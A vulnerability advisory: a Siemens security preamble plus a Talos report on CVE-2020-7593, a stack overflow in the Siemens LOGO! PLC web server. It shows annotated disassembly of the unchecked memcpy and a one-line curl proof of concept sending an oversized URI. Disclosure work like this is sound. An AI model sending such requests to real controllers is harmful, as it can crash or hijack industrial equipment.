GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices
with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens
recommends to conﬁgure the environment according to Siemens’ operational guidelines for Industrial
Security (Download: https://www.siemens.com/cert/operational-guidelines-industrial-security), and to
follow the recommendations in the product manuals.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2020-7593

A buffer overﬂow vulnerability exists in the Web Server functionality of the device. A remote unauthenti-
cated attacker could send a specially crafted HTTP request to cause a memory corruption, potentially
resulting in remote code execution.

# Talos Vulnerability Report

### TALOS-2020-1069

## Siemens LOGO! Web Server Code Execution Vulnerability

##### July 15, 2020

##### CVE Number

CVE-2020-7593

### Summary

An exploitable code execution vulnerability exists in the Web Server functionality of Siemens LOGO! 1.82.02, 12/24RCE Version 0BA and 230RCE Version 0BA. A specially crafted HTTP request can cause memory corruption resulting in a code execution. An attacker can send an unauthenticated packet to trigger this vulnerability.

### Tested Versions

Siemens LOGO! 1.82.02

Siemens LOGO! 12/24RCE Version 0BA

Siemens LOGO! 230RCE Version 0BA

### Product URLs

<https://new.siemens.com/global/en/products/automation/systems/industrial/plc/logo.html>

### CVSSv3 Score

10.0 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### CWE

CWE-120 - Buffer Copy without Checking Size of Input (‘Classic Buffer Overflow’)

### Details

Siemens LOGO! is an intelligent logic module (PLC) meant for automation projects such as industrial control systems, office/commercial and home settings. It is deployed worldwide and can be control remotely.

The HTTP Server for the LOGO! system doesn’t properly check the length of a URI directory before copying the URI to the stack, resulting in a stack overflow. Our research and testing indicates that the cause of this crash resides within the u\_bm3.bin firmware image at address 0x9be8e:

0009BE84 A5 EB 07 0A SUB.W R10, R5, R7 # r10 = length of URI between opening/closing slashes
0009BE88 52 46 MOV R2, R10 # len - our user-controlled length
0009BE8A 39 46 MOV R1, R7 # src - the URI requested
0009BE8C 05 A8 ADD R0, SP, #0x14. # destination stack address
0009BE8E D7 F7 0F FA BL call\_memcpy # overflow the stack
0009BE92 05 A8 ADD R0, SP, #0x78+requested\_dir\_without\_slashes ; s1
0009BE94 00 21 MOVS R1, #0
0009BE96 0A F8 00 10 STRB.W R1, [R10,R0] ; NULL terminate the copied URI dir on the stack

### Exploit Proof of Concept

curl http://<LOGO!IP>/`python -c 'print("A" 100)'`/

### Timeline

2020-05-07 - Vendor Disclosure

2020-07-14 - Vendor Patched
